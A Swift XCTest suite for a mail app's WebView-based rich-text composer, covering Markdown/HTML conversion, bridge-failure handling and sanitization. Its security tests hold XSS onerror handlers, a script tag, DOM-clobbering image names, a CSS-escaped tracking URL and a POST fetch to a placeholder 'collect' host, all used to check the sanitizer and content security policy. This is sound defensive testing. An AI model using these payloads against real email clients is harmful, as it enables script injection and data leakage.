import XCTest
@testable import CabalmailKit
import CabalmailKitTestSupport

/// Conversion-rule tests. The Apple-side composer must produce the same wire
/// HTML / Markdown bytes as the React composer, so the rules baked into
/// `editor-bridge.js` (marked with `breaks: true` + flattenParagraphs, the
/// turndown ZWSP-trick paragraph + line-break rules, the styleParagraphs
/// regex) are exercised end-to-end against a live `WKWebView`-backed
/// controller — same code path the user hits at send time. A local `file://`
/// load needs no app host (#948), so this runs under `swift test` and on any
/// booted simulator — but NOT on CI's freshly `simctl create`d iOS/visionOS
/// devices, which never launch a WebContent process under a hostless runner;
/// apple.yml carves this suite out on those legs and the macOS leg carries
/// the coverage.
@MainActor
final class RichTextEditorControllerTests: XCTestCase {
    private var controller: RichTextEditorController!

    override func setUp() async throws {
        try await super.setUp()
        // A cold simulator takes well over the controller's 10s production
        // readyTimeout to boot its first WebContent process (measured 12.6s
        // on a freshly booted iPhone 17 Pro sim). Past the deadline every
        // bridge call answers with its empty fallback, so the suite would
        // fail on `""` comparisons that say nothing about conversion rules —
        // give the boot room, and assert the bridge came up here so a
        // runner that genuinely cannot host it fails by name instead.
        controller = RichTextEditorController(readyTimeout: 120)
        await controller.waitUntilReady()
        XCTAssertNil(controller.bridgeFailure, "editor bridge never booted in this runner")
        XCTAssertTrue(controller.isReady)
    }

    override func tearDown() async throws {
        controller = nil
        try await super.tearDown()
    }

    // MARK: - Markdown -> HTML

    func testMarkdownToHtmlSingleParagraph() async {
        let html = await controller.markdownToHtml("Hello world")
        XCTAssertEqual(html, "<p>Hello world</p>\n")
    }

    /// Blank-line-separated paragraphs collapse to a single <p> with
    /// <br><br> between them — the flattenParagraphs rule.
    func testMarkdownToHtmlMultipleParagraphsFlattens() async {
        let html = await controller.markdownToHtml("Para 1\n\nPara 2")
        XCTAssertEqual(html, "<p>Para 1<br><br>Para 2</p>\n")
    }

    /// `breaks: true` => single newline becomes <br>, not a space.
    func testMarkdownToHtmlSingleNewlineBecomesBr() async {
        let html = await controller.markdownToHtml("Line A\nLine B")
        XCTAssertEqual(html, "<p>Line A<br>Line B</p>\n")
    }

    func testMarkdownToHtmlHeadings() async {
        let html = await controller.markdownToHtml("# Heading")
        XCTAssertTrue(html.contains("<h1>Heading</h1>"), "got: \(html)")
    }

    // MARK: - HTML -> Markdown

    func testHtmlToMarkdownStripsParagraphMargins() async {
        let markdown = await controller.htmlToMarkdown(
            "<p>Para 1</p><p>Para 2</p>"
        )
        // Each <p> emits content + \n; turndown's outer trim eats the
        // trailing newline — no blank lines around paragraphs.
        XCTAssertEqual(markdown, "Para 1\nPara 2")
    }

    /// Two consecutive <br>s must accumulate two newlines (this is what the
    /// ZWSP placeholder trick exists for — without it turndown collapses
    /// adjacent newlines).
    func testHtmlToMarkdownConsecutiveBrAccumulates() async {
        let markdown = await controller.htmlToMarkdown("<p>One<br><br>Two</p>")
        XCTAssertEqual(markdown, "One\n\nTwo")
    }

    func testHtmlToMarkdownAtxHeading() async {
        let markdown = await controller.htmlToMarkdown("<h1>Title</h1>")
        XCTAssertTrue(markdown.hasPrefix("# Title"), "got: \(markdown)")
    }

    func testHtmlToMarkdownHorizontalRuleIsTripleDash() async {
        let markdown = await controller.htmlToMarkdown("<p>Above</p><hr><p>Below</p>")
        XCTAssertTrue(markdown.contains("---"), "got: \(markdown)")
    }

    /// ZWSP placeholders that turndown emits are stripped before return.
    func testHtmlToMarkdownStripsZeroWidthSpace() async {
        let markdown = await controller.htmlToMarkdown("<p>Hello</p>")
        XCTAssertFalse(markdown.contains("\u{200B}"), "ZWSP leaked: \(markdown)")
    }

    // MARK: - styleParagraphs

    func testStyleParagraphsAddsMarginZero() async {
        let styled = await controller.styleParagraphs("<p>Hello</p>")
        XCTAssertEqual(styled, "<p style=\"margin:0\">Hello</p>")
    }

    /// styleParagraphs must respect an existing style attribute — leave it
    /// alone rather than double-stamping a margin:0.
    func testStyleParagraphsSkipsExistingStyle() async {
        let input = "<p style=\"color:red\">Hello</p>"
        let styled = await controller.styleParagraphs(input)
        XCTAssertEqual(styled, input)
    }

    func testStyleParagraphsPreservesOtherAttributes() async {
        let styled = await controller.styleParagraphs("<p class=\"foo\">Hi</p>")
        XCTAssertEqual(styled, "<p class=\"foo\" style=\"margin:0\">Hi</p>")
    }

    // MARK: - Editor surface

    func testEditorRoundTripsSetHtmlGetHtml() async {
        await controller.setHTML("<p>Hello there</p>")
        let read = await controller.getHTML()
        XCTAssertEqual(read, "<p>Hello there</p>")
    }

    func testEmptyEditorReportsEmpty() async {
        await controller.setHTML("")
        let empty = await controller.isEmpty()
        XCTAssertTrue(empty)
    }

    func testEditorWithContentReportsNonEmpty() async {
        await controller.setHTML("<p>Hello</p>")
        let empty = await controller.isEmpty()
        XCTAssertFalse(empty)
    }

    /// Select-all + delete does not empty the element. WebKit keeps the
    /// block scaffolding, and on a document that had paragraphs in it —
    /// which is every compose with a signature, a reply or a resumed draft
    /// — what is left is `<p><br></p>`. `isEmpty()` used to match only
    /// `''`, `'<p></p>'` and `'<br>'`, so `getHTML()` handed those 12
    /// characters to the send path as authored copy and the composer went
    /// on asking "Discard draft?" over a visibly empty pane (#1138).
    func testClearedParagraphScaffoldingReportsEmpty() async {
        for residue in ["<p><br></p>", "<br>", "<p></p>", "<div><br></div>", "<p><br></p><p><br></p>"] {
            await controller.setHTML(residue)
            let empty = await controller.isEmpty()
            XCTAssertTrue(empty, "\(residue) is scaffolding, not content")
            let html = await controller.getHTML()
            XCTAssertEqual(html, "", "\(residue) must not reach the wire")
        }
    }

    /// Whitespace-only is the same answer, and matches how the Markdown
    /// pane is already read (`ComposeBodyPolicy.source` trims before
    /// deciding whether that buffer is filled).
    func testWhitespaceOnlyBodyReportsEmpty() async {
        await controller.setHTML("<p>   </p>")
        let empty = await controller.isEmpty()
        XCTAssertTrue(empty)
    }

    /// The negative control the text-based test needs: content that carries
    /// no text at all still counts, so an image-only or rule-only body is
    /// never silently dropped.
    func testNonTextContentIsNotEmpty() async {
        for markup in ["<p><img src=\"cid:x\"></p>", "<hr>"] {
            await controller.setHTML(markup)
            let empty = await controller.isEmpty()
            XCTAssertFalse(empty, "\(markup) is content")
        }
    }

    // MARK: - Round-trips

    /// Source of truth: round-tripping markdown through the editor produces
    /// the same markdown back out. This is the property the React composer
    /// relies on so a user toggling Rich Text -> Markdown -> Rich Text never
    /// surprises themselves with whitespace shifts.
    func testMarkdownRoundTrip() async {
        let cases = [
            "Hello world",
            "Para 1\n\nPara 2",
            "Line A\nLine B",
            "# Heading\n\nBody"
        ]
        for source in cases {
            let html = await controller.markdownToHtml(source)
            let back = await controller.htmlToMarkdown(html)
            XCTAssertEqual(back, source, "round-trip drift on: \(source.debugDescription)")
        }
    }

    /// styleParagraphs applied on top of a flattened markdown render shapes
    /// the wire HTML the recipient ultimately sees — single-spaced
    /// paragraphs, exactly what the React composer ships.
    func testWireShapeForMarkdownOnlyCompose() async {
        let raw = await controller.markdownToHtml("Para 1\n\nPara 2")
        let styled = await controller.styleParagraphs(raw)
        XCTAssertEqual(styled, "<p style=\"margin:0\">Para 1<br><br>Para 2</p>\n")
    }
}

// MARK: - Checked conversions

/// The conversions a message body is built from go through `checked`, which
/// has to report a failed call instead of answering the lenient API's `""`.
/// That `""` is what went out as an empty MIME part: `bridgeFailure` only
/// covers a bridge known to be dead (#745), so one call failing on a live
/// bridge passed every guard. Same file as the suite so these share its
/// booted controller and its CI carve-out.
extension RichTextEditorControllerTests {
    /// Positive control: on a healthy bridge the checked calls answer
    /// exactly what the lenient ones do.
    func testCheckedConversionsMatchTheLenientOnes() async throws {
        let html = try await controller.checked.markdownToHtml("Hello world")
        XCTAssertEqual(html, "<p>Hello world</p>\n")

        let markdown = try await controller.checked.htmlToMarkdown("<p>Hello</p>")
        let lenientMarkdown = await controller.htmlToMarkdown("<p>Hello</p>")
        XCTAssertEqual(markdown, lenientMarkdown)

        await controller.setHTML("<p>Kept</p>")
        let read = try await controller.checked.getHTML()
        XCTAssertEqual(read, "<p>Kept</p>")
    }

    /// The failure the send path used to miss: each call throws on a bridge
    /// that is still up, while the lenient API answers `""` and nothing
    /// records a bridge failure.
    func testCheckedCallsThrowWhenOneCallFailsOnALiveBridge() async throws {
        for method in ["getHTML", "markdownToHtml", "htmlToMarkdown"] {
            try await breakBridgeMethod(method)
        }

        let lenient = await controller.markdownToHtml("Hello world")
        XCTAssertEqual(lenient, "", "the fallback that went out as a blank part")
        XCTAssertNil(controller.bridgeFailure, "the #745 guard sees nothing wrong")
        XCTAssertTrue(controller.isReady)

        await assertCallFailure("getHTML") {
            try await self.controller.checked.getHTML()
        }
        await assertCallFailure("markdownToHtml") {
            try await self.controller.checked.markdownToHtml("Hello world")
        }
        await assertCallFailure("htmlToMarkdown") {
            try await self.controller.checked.htmlToMarkdown("<p>Hello</p>")
        }
    }

    /// The other way a call comes back empty-handed: it answers, but not
    /// with text. The lenient API reads that as `""` too.
    func testCheckedCallThrowsWhenTheAnswerIsNotText() async throws {
        try await breakBridgeMethod("markdownToHtml", body: "return 42;")

        let lenient = await controller.markdownToHtml("Hello world")
        XCTAssertEqual(lenient, "")

        let failure = await assertCallFailure("markdownToHtml") {
            try await self.controller.checked.markdownToHtml("Hello world")
        }
        XCTAssertEqual(failure?.reason, "the editor answered without text")
    }

    /// A bridge known to be dead throws without evaluating anything, and
    /// says why.
    func testCheckedCallsThrowOnADeadBridge() async {
        controller.webViewWebContentProcessDidTerminate(controller.webView)
        let reason = controller.bridgeFailure

        let failure = await assertCallFailure("markdownToHtml") {
            try await self.controller.checked.markdownToHtml("Hello world")
        }
        XCTAssertNotNil(reason)
        XCTAssertEqual(failure?.reason, reason)
    }

    /// Replaces one `window.cabal` method so that calls to it fail. By
    /// default it throws, the way a page-side exception fails a call.
    private func breakBridgeMethod(
        _ method: String,
        body: String = "throw new Error('probe');"
    ) async throws {
        _ = try await controller.webView.evaluateJavaScript(
            "window.cabal.\(method) = function () { \(body) }; true"
        )
    }

    @discardableResult
    private func assertCallFailure(
        _ method: String,
        _ call: () async throws -> String,
        file: StaticString = #filePath,
        line: UInt = #line
    ) async -> RichTextEditorController.CallFailure? {
        do {
            let answer = try await call()
            XCTFail("\(method) answered \(answer.debugDescription) instead of throwing", file: file, line: line)
        } catch let failure as RichTextEditorController.CallFailure {
            XCTAssertEqual(failure.method, method, file: file, line: line)
            return failure
        } catch {
            XCTFail("\(method) threw \(error), not a CallFailure", file: file, line: line)
        }
        return nil
    }
}

// MARK: - Content from outside the editor

/// The editor page runs script for itself, so markup that arrives with a
/// message must not bring any along. Reply, forward and mailto seed the
/// editor from text somebody else wrote, and marked passes raw HTML through.
/// Each probe here names `window.__cabalProbe`; nothing may set it.
/// Same file as the suite for its booted controller and its CI carve-out.
extension RichTextEditorControllerTests {
    private static let handler = #"<img src="cabal-probe.png" onerror="window.__cabalProbe = 'ran'">"#

    func testReplySeedRunsNothingFromTheQuotedText() async throws {
        let envelope = Envelope(
            uid: 1,
            messageId: nil,
            subject: "Hello",
            from: [EmailAddress(name: "Sender", mailbox: "sender", host: "example.com")],
            flags: []
        )
        let body = "Hi there.\n\n\(Self.handler)\n\n> \(Self.handler)"
        let draft = ReplyBuilder.build(from: envelope, body: body, mode: .reply, userAddresses: [])

        try await assertSeedRunsNothing(draft.body)
    }

    func testForwardHeaderRunsNothingFromTheSendersNameOrSubject() async throws {
        let envelope = Envelope(
            uid: 1,
            messageId: nil,
            subject: "Subject \(Self.handler)",
            from: [EmailAddress(name: "Name \(Self.handler)", mailbox: "sender", host: "example.com")],
            flags: []
        )
        let draft = ReplyBuilder.build(from: envelope, body: "Body", mode: .forward, userAddresses: [])
        XCTAssertTrue(draft.body.contains("onerror"), "the fixture must carry the handler into the seed")

        try await assertSeedRunsNothing(draft.body)
    }

    func testMailtoBodyRunsNothing() async throws {
        let body = try XCTUnwrap("Hello \(Self.handler)".addingPercentEncoding(withAllowedCharacters: .alphanumerics))
        let url = try XCTUnwrap(URL(string: "mailto:someone@example.com?body=\(body)"))
        let draft = try XCTUnwrap(MailtoURL(url)).draft()
        XCTAssertTrue(draft.body.contains("onerror"), "the fixture must carry the handler into the seed")

        try await assertSeedRunsNothing(draft.body)
    }

    /// The second lock: markup that reaches the page without going through
    /// `setHTML` still runs no inline handler, because the page's content
    /// security policy refuses it.
    func testPageRefusesAnInlineHandlerThatSkipsTheSanitizer() async throws {
        try await watchPolicyViolations()
        _ = try await controller.webView.evaluateJavaScript(
            "document.getElementById('editor').insertAdjacentHTML('beforeend', \(jsonString(Self.handler))); true"
        )

        let ran = try await probeAfterImagesSettle()
        XCTAssertEqual(ran, "", "an inline handler ran in the composer")
        // Fails here if the page never reports a script-src violation.
        try await waitUntilOnMainActor { try await self.violations().contains { $0.hasPrefix("script-src") } }
    }

    func testPageCannotSendRequests() async throws {
        try await watchPolicyViolations()
        _ = try await controller.webView.evaluateJavaScript(
            "fetch('https://example.invalid/collect', { method: 'POST', body: 'x' }).catch(function () {}); true"
        )

        // Fails here if the page never reports a connect-src violation.
        try await waitUntilOnMainActor { try await self.violations().contains("connect-src") }
    }

    func testReplySeedShowsRemoteImagesAsText() async throws {
        let markdown = "![logo](https://tracker.invalid/logo.png)\n\n<img src=\"https://tracker.invalid/p.gif\">"
            + "\n\n![part](cid:part1)"
        let html = await controller.markdownToHtml(markdown)

        await controller.setHTML(html, blockingRemoteImages: true)
        let blocked = await controller.getHTML()
        XCTAssertFalse(blocked.contains("tracker.invalid/logo.png\""), blocked)
        XCTAssertFalse(blocked.contains("<img src=\"https"), blocked)
        XCTAssertTrue(blocked.contains("logo"), blocked)
        XCTAssertTrue(blocked.contains("https://tracker.invalid/p.gif"), "an image with no alt text shows its address")
        XCTAssertTrue(blocked.contains("<img src=\"cid:part1\""), "a cid: part is not remote: \(blocked)")

        // A paste or a reopened draft keeps its images.
        await controller.setHTML(html)
        let kept = await controller.getHTML()
        XCTAssertTrue(kept.contains("<img src=\"https://tracker.invalid/logo.png\""), kept)
    }

    /// Blocking drops inline style outright: a CSS escape spells `url(`
    /// without the attribute's text containing it.
    func testReplySeedDropsInlineStyle() async throws {
        let escaped = #"<p><span style="background:u\rl(https://tracker.invalid/e.png)">s</span></p>"#
        await controller.setHTML(escaped, blockingRemoteImages: true)
        let html = await controller.getHTML()
        XCTAssertEqual(html, "<p><span>s</span></p>")
    }

    func testReplySeedKeepsTheSignaturesOwnImages() async throws {
        let signature = "Me\n\n![sig](https://signature.invalid/sig.png)"
        let seed = SignatureFormatter.seedBody(base: "\n\n> ![t](https://tracker.invalid/t.png)", signature: signature)
        let html = await controller.markdownToHtml(seed)

        await controller.setHTML(html, blockingRemoteImages: true, keepingImagesFrom: signature)
        let seeded = await controller.getHTML()
        XCTAssertTrue(seeded.contains("<img src=\"https://signature.invalid/sig.png\""), seeded)
        XCTAssertFalse(seeded.contains("<img src=\"https://tracker.invalid"), seeded)
    }

    func testPastedHtmlLosesItsHandlersAndKeepsItsFormatting() async throws {
        let pasted = "<p><b>bold</b> and <i>italic</i>\(Self.handler)</p>"
            + "<script>window.__cabalProbe = 'script'</script>"
        let html = try await deliver("paste", html: pasted)
        XCTAssertTrue(html.contains("<b>bold</b>"), html)
        XCTAssertTrue(html.contains("<i>italic</i>"), html)
        XCTAssertFalse(html.contains("onerror"), html)
        XCTAssertFalse(html.contains("<script"), html)
        let ran = try await probeAfterImagesSettle()
        XCTAssertEqual(ran, "")
    }

    /// A named image would shadow the document method of that name and
    /// break the editor. The paragraphs make the paste path flatten them,
    /// which must not reopen a quoted attribute.
    func testPasteCannotShadowTheDocumentsMethods() async throws {
        let pasted = #"<p>a</p><p title="><img name=createElement src=cid:x>">b</p>"#
            + #"<img name="execCommand" src="cid:y">"#
        let html = try await deliver("paste", html: pasted)
        XCTAssertFalse(html.contains("name="), html)
        let intact = try await controller.webView.evaluateJavaScript(
            "typeof document.createElement === 'function' && typeof document.execCommand === 'function'"
        ) as? Bool
        XCTAssertEqual(intact, true, "a pasted image shadowed a document method")
    }

    func testDroppedHtmlTakesThePastePath() async throws {
        let dropped = "<p><b>dropped</b>\(Self.handler)</p><img name=\"execCommand\" src=\"cid:y\">"
        let html = try await deliver("drop", html: dropped)
        XCTAssertTrue(html.contains("<b>dropped</b>"), html)
        XCTAssertFalse(html.contains("onerror"), html)
        XCTAssertFalse(html.contains("name="), html)
        let ran = try await probeAfterImagesSettle()
        XCTAssertEqual(ran, "")
    }

    /// Script in the page can't navigate it: not to another local file, and
    /// not back to the editor itself, which would reload it and wipe the
    /// draft.
    func testPageCannotNavigateAwayFromTheEditor() async throws {
        await controller.setHTML("<p>Kept</p>")
        let other = controller.webView.url?.deletingLastPathComponent()
            .appendingPathComponent("editor-bridge.js").absoluteString ?? ""
        for target in ["location.href", jsonString(other)] {
            _ = try await controller.webView.evaluateJavaScript("location.href = \(target); true")
            // Nothing to wait *for* when the navigation is refused, so give
            // a navigation that was allowed time to replace the page.
            try await Task.sleep(nanoseconds: 1_000_000_000)
            let read = await controller.getHTML()
            XCTAssertEqual(read, "<p>Kept</p>", "the page navigated to \(target)")
            XCTAssertEqual(controller.webView.url?.lastPathComponent, "editor.html")
        }
    }

    // MARK: Helpers

    /// Seeds the editor the way `ComposeViewModel` does and checks that
    /// the handler neither survived nor ran.
    private func assertSeedRunsNothing(
        _ markdown: String,
        file: StaticString = #filePath,
        line: UInt = #line
    ) async throws {
        let html = await controller.markdownToHtml(markdown)
        XCTAssertTrue(html.contains("onerror"), "marked passes raw HTML through", file: file, line: line)

        await controller.setHTML(html, blockingRemoteImages: true)

        let seeded = await controller.getHTML()
        XCTAssertFalse(seeded.contains("onerror"), seeded, file: file, line: line)
        XCTAssertTrue(seeded.contains("<img"), "the image itself stays: \(seeded)", file: file, line: line)
        let ran = try await probeAfterImagesSettle()
        XCTAssertEqual(ran, "", "a handler from the seed ran in the composer", file: file, line: line)
    }

    /// Waits until every image on the page has loaded or failed, by which
    /// time an inline `onerror` would have run, then reads the probe.
    private func probeAfterImagesSettle() async throws -> String {
        try await waitUntilOnMainActor {
            try await self.controller.webView.evaluateJavaScript(
                "Array.from(document.images).every(function (img) { return img.complete; })"
            ) as? Bool == true
        }
        try await Task.sleep(nanoseconds: 200_000_000)
        let value = try await controller.webView.evaluateJavaScript("String(window.__cabalProbe || '')")
        return value as? String ?? "unreadable"
    }

    /// Puts the caret at the end of the editor and fires a `paste` or a
    /// `drop` carrying `html`, as WebKit would, then reads the editor.
    private func deliver(_ kind: String, html: String) async throws -> String {
        let read = try await controller.webView.evaluateJavaScript(
            """
            (function (kind, html) {
              const editor = document.getElementById('editor');
              editor.focus();
              const range = document.createRange();
              range.selectNodeContents(editor);
              range.collapse(false);
              const selection = window.getSelection();
              selection.removeAllRanges();
              selection.addRange(range);
              const data = new DataTransfer();
              data.setData('text/html', html);
              const init = { bubbles: true, cancelable: true };
              const field = kind === 'paste' ? 'clipboardData' : 'dataTransfer';
              init[field] = data;
              const Kind = kind === 'paste' ? ClipboardEvent : (window.DragEvent || MouseEvent);
              const event = new Kind(kind, init);
              if (event[field] !== data) Object.defineProperty(event, field, { value: data });
              editor.dispatchEvent(event);
              return editor.innerHTML;
            })(\(jsonString(kind)), \(jsonString(html)))
            """
        ) as? String
        return try XCTUnwrap(read)
    }

    private func watchPolicyViolations() async throws {
        _ = try await controller.webView.evaluateJavaScript(
            """
            window.__cabalViolations = [];
            document.addEventListener('securitypolicyviolation', function (event) {
              window.__cabalViolations.push(String(event.effectiveDirective || event.violatedDirective));
            });
            true
            """
        )
    }

    private func violations() async throws -> [String] {
        let value = try await controller.webView.evaluateJavaScript("window.__cabalViolations.join(' ')")
        return (value as? String ?? "").split(separator: " ").map(String.init)
    }

    private func jsonString(_ value: String) -> String {
        let data = (try? JSONSerialization.data(withJSONObject: [value])) ?? Data()
        return String(String(data: data, encoding: .utf8)?.dropFirst().dropLast() ?? "\"\"")
    }
}
